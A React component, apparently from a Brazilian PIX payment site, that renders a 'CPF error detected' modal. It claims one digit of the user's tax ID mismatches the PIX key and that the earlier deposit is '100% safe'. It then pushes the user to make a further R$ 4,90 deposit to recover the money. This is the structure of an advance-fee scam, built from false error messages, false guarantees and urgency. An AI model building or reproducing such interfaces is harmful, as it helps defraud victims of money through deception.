import React from 'react';
import { CheckCircle, Shield, ChevronRight, RefreshCw, Lock } from 'lucide-react';

interface DataMismatchModalProps {
  isOpen: boolean;
  onReviewData: () => void;
  depositAmount: number;
}

export const DataMismatchModal: React.FC<DataMismatchModalProps> = ({
  isOpen,
  onReviewData,
  depositAmount
}) => {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/95 backdrop-blur-sm flex items-center justify-center p-4 z-[70]">
      <div className="bg-white rounded-2xl w-full max-w-sm shadow-2xl overflow-hidden animate-scale-in">

        <div className="bg-gradient-to-br from-blue-500 to-blue-600 p-5 text-center relative overflow-hidden">
          <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-2">
            <Shield className="w-6 h-6 text-white" />
          </div>
          <h2 className="text-lg font-bold text-white mb-1">Erro no CPF Detectado</h2>
          <p className="text-white/90 text-sm">Apenas 1 digito esta incorreto</p>
        </div>

        <div className="p-5">
          {/* Valor Seguro */}
          <div className="bg-green-50 border-2 border-green-300 rounded-xl p-4 mb-4">
            <div className="flex items-center justify-center gap-2 mb-3">
              <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center">
                <CheckCircle className="w-5 h-5 text-white" />
              </div>
              <div className="text-center">
                <div className="text-2xl font-bold text-green-700">
                  R$ {depositAmount.toFixed(2).replace('.', ',')}
                </div>
                <p className="text-green-600 text-xs font-bold">
                  DEPOSITO SEGURO
                </p>
              </div>
            </div>

            <div className="bg-white rounded-lg p-3 border border-green-300">
              <p className="text-green-800 text-sm leading-relaxed font-medium text-center">
                Seu dinheiro esta 100% seguro e sera devolvido!
              </p>
            </div>
          </div>

          {/* Problema Identificado */}
          <div className="bg-blue-50 rounded-xl p-3 mb-4 border-2 border-blue-200">
            <div className="flex items-start gap-2">
              <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                <span className="text-white text-xs font-bold">!</span>
              </div>
              <div>
                <h4 className="text-blue-900 font-bold text-sm mb-1">O que aconteceu?</h4>
                <p className="text-blue-800 text-xs leading-relaxed mb-2">
                  Detectamos que <span className="font-bold">1 digito do seu CPF</span> esta diferente do titular da chave PIX.
                </p>
                <p className="text-blue-700 text-xs leading-relaxed">
                  E um erro simples de digitacao que vamos corrigir juntos agora!
                </p>
              </div>
            </div>
          </div>

          {/* Solução Clara */}
          <div className="bg-gradient-to-r from-green-50 to-emerald-50 rounded-xl p-4 mb-4 border-2 border-green-300">
            <div className="flex items-start gap-2 mb-3">
              <RefreshCw className="w-5 h-5 text-green-600 flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="text-green-900 font-bold text-sm mb-2">Solucao Rapida (2 minutos)</h4>
                <div className="space-y-2">
                  <div className="flex items-start gap-2">
                    <span className="text-green-600 font-bold text-xs mt-0.5">1.</span>
                    <p className="text-green-800 text-xs leading-relaxed">
                      Corrija o digito do CPF
                    </p>
                  </div>
                  <div className="flex items-start gap-2">
                    <span className="text-green-600 font-bold text-xs mt-0.5">2.</span>
                    <p className="text-green-800 text-xs leading-relaxed">
                      Faca novo deposito de R$ 4,90
                    </p>
                  </div>
                  <div className="flex items-start gap-2">
                    <span className="text-green-600 font-bold text-xs mt-0.5">3.</span>
                    <p className="text-green-800 text-xs leading-relaxed">
                      <span className="font-bold">Receba os R$ {depositAmount.toFixed(2).replace('.', ',')} de volta + R$ 4,90</span> = Total R$ {(depositAmount + 4.90).toFixed(2).replace('.', ',')}
                    </p>
                  </div>
                </div>
              </div>
            </div>

            <div className="bg-white rounded-lg p-2 border border-green-300">
              <div className="flex items-center justify-center gap-2">
                <Lock className="w-3 h-3 text-green-600" />
                <p className="text-green-800 text-xs font-bold">
                  Voce NAO perdeu nada! Tudo sera creditado
                </p>
              </div>
            </div>
          </div>

          {/* CTA */}
          <button
            onClick={onReviewData}
            className="w-full bg-gradient-to-r from-green-500 to-emerald-600 text-white font-bold py-4 rounded-xl hover:from-green-600 hover:to-emerald-700 transition-all duration-300 active:scale-95 shadow-lg mb-2"
            style={{ touchAction: 'manipulation' }}
          >
            <div className="flex items-center justify-center gap-2">
              <span>CORRIGIR CPF AGORA</span>
              <ChevronRight className="w-5 h-5" />
            </div>
          </button>

          <p className="text-center text-green-700 text-xs font-medium">
            Processo 100% seguro - Dinheiro garantido
          </p>
        </div>
      </div>
    </div>
  );
};
